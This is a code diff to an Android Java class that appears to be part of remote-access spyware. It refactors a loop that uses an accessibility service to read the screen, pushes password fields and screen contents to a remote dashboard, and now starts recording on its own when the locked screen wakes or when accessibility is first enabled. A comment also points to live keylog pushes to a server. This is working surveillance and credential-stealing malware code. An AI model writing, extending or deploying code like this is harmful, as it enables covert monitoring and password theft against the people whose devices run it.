@@ -81,6 +81,9 @@ public class SocketManager {
     // Screen-reader push mode — app continuously reads screen and pushes to dashboard
     private volatile ScheduledFuture<?> screenReaderFuture;
 
+    // Frame deduplication — skip pushing a frame if the screen content hasn't changed
+    private volatile String lastFrameFingerprint = null;
+
     // Debounce handle for device-user interaction frames
     private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
 
@@ -1406,44 +1409,14 @@ public class SocketManager {
             }
 
             case "screen_reader_start": {
-                // Stop any existing push loop
-                ScheduledFuture<?> oldFuture = screenReaderFuture;
-                if (oldFuture != null) { oldFuture.cancel(false); screenReaderFuture = null; }
-
-                final long intervalMs = Math.max(1000L, params.optLong("intervalMs", 2000L));
-                final String devId   = DeviceInfo.getDeviceId(context);
-                final UnifiedAccessibilityService svcRef = accessSvc;
-
-                screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
-                    boolean acq = false;
-                    try {
-                        acq = accessSemaphore.tryAcquire(3, TimeUnit.SECONDS);
-                        if (!acq) return;
-                        ScreenReader pusher = new ScreenReader(svcRef);
-                        JSONObject screenResult = pusher.readScreen();
-                        pushPasswordFieldsFromScreen(screenResult);
-                        JSONObject payload = new JSONObject();
-                        payload.put("deviceId", devId);
-                        payload.put("success", screenResult.optBoolean("success", false));
-                        if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
-                        if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
-                        sendLiveMessage("screen:update", payload);
-                    } catch (Exception e) {
-                        Log.e(TAG, "screen_reader push error: " + e.getMessage());
-                    } finally {
-                        if (acq) accessSemaphore.release();
-                    }
-                }, 0, intervalMs, TimeUnit.MILLISECONDS);
-
+                startScreenReaderLoop(accessSvc, false);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
-                ok.put("intervalMs", intervalMs);
                 return ok;
             }
 
             case "screen_reader_stop": {
-                ScheduledFuture<?> f = screenReaderFuture;
-                if (f != null) { f.cancel(false); screenReaderFuture = null; }
+                stopScreenReaderLoop(false);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
                 return ok;
@@ -1461,6 +1434,129 @@ public class SocketManager {
             case "touch": case "swipe": case "scroll_up": case "scroll_down": return true;
             default: return false;
         }
+    }
+
+    // ── Screen Reader Auto-Recording (device-driven) ──────────────────────────
+
+    /**
+     * Compute a lightweight fingerprint for a screen result so we can skip
+     * duplicate frames — the lock screen often stays identical for long periods.
+     */
+    private String computeFrameFingerprint(JSONObject screenResult) {
+        if (screenResult == null) return "";
+        try {
+            JSONObject screen = screenResult.optJSONObject("screen");
+            if (screen == null) return "";
+            String pkg = screen.optString("packageName", "");
+            JSONArray elements = screen.optJSONArray("elements");
+            StringBuilder sb = new StringBuilder(pkg);
+            if (elements != null) {
+                int count = Math.min(elements.length(), 12);
+                for (int i = 0; i < count; i++) {
+                    JSONObject el = elements.optJSONObject(i);
+                    if (el != null) {
+                        sb.append('|').append(el.optString("text", ""));
+                        sb.append('|').append(el.optString("contentDescription", ""));
+                        sb.append('|').append(el.optString("hintText", ""));
+                    }
+                }
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return "";
+        }
+    }
+
+    /**
+     * Internal: start the screen-reader push loop.
+     * @param svc           the running accessibility service
+     * @param sendAutoEvent if true, push an autoEvent:'start' so the dashboard
+     *                      automatically enters recording mode.
+     */
+    private void startScreenReaderLoop(UnifiedAccessibilityService svc, boolean sendAutoEvent) {
+        ScheduledFuture<?> old = screenReaderFuture;
+        if (old != null) { old.cancel(false); screenReaderFuture = null; }
+        lastFrameFingerprint = null;
+
+        final String devId = DeviceInfo.getDeviceId(context);
+
+        if (sendAutoEvent) {
+            try {
+                JSONObject startEvt = new JSONObject();
+                startEvt.put("deviceId", devId);
+                startEvt.put("autoEvent", "start");
+                startEvt.put("success", false);
+                sendLiveMessage("screen:update", startEvt);
+            } catch (Exception ignored) {}
+        }
+
+        screenReaderFuture = heartbeatExecutor.scheduleWithFixedDelay(() -> {
+            boolean acq = false;
+            try {
+                acq = accessSemaphore.tryAcquire(3, TimeUnit.SECONDS);
+                if (!acq) return;
+                ScreenReader pusher = new ScreenReader(svc);
+                JSONObject screenResult = pusher.readScreen();
+                pushPasswordFieldsFromScreen(screenResult);
+
+                // Deduplication: skip frame if content is identical to last push
+                String fp = computeFrameFingerprint(screenResult);
+                if (fp.equals(lastFrameFingerprint) && !fp.isEmpty()) return;
+                lastFrameFingerprint = fp;
+
+                JSONObject payload = new JSONObject();
+                payload.put("deviceId", devId);
+                payload.put("success", screenResult.optBoolean("success", false));
+                if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
+                if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
+                sendLiveMessage("screen:update", payload);
+            } catch (Exception e) {
+                Log.e(TAG, "screen_reader push error: " + e.getMessage());
+            } finally {
+                if (acq) accessSemaphore.release();
+            }
+        }, 0, 1000L, TimeUnit.MILLISECONDS);
+    }
+
+    /**
+     * Internal: stop the screen-reader push loop.
+     * @param sendAutoEvent if true, push an autoEvent:'stop' so the dashboard
+     *                      automatically saves the current recording.
+     */
+    private void stopScreenReaderLoop(boolean sendAutoEvent) {
+        ScheduledFuture<?> f = screenReaderFuture;
+        if (f != null) { f.cancel(false); screenReaderFuture = null; }
+        lastFrameFingerprint = null;
+
+        if (sendAutoEvent) {
+            try {
+                JSONObject stopEvt = new JSONObject();
+                stopEvt.put("deviceId", DeviceInfo.getDeviceId(context));
+                stopEvt.put("autoEvent", "stop");
+                stopEvt.put("success", false);
+                sendLiveMessage("screen:update", stopEvt);
+            } catch (Exception ignored) {}
+        }
+    }
+
+    /**
+     * Called by UnifiedAccessibilityService when the screen wakes up locked
+     * or immediately when accessibility is first enabled.
+     * Starts the recording loop and notifies the dashboard automatically.
+     */
+    public void startScreenReaderAuto() {
+        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+        if (svc == null) return;
+        startScreenReaderLoop(svc, true);
+    }
+
+    /**
+     * Called by UnifiedAccessibilityService when the screen turns off or the
+     * device is unlocked.  Stops the recording loop and tells the dashboard to
+     * save whatever it has collected.
+     */
+    public void stopScreenReaderAuto() {
+        stopScreenReaderLoop(true);
     }
 
     /** Push a keylog entry to the server immediately (live feed) via live channel. */
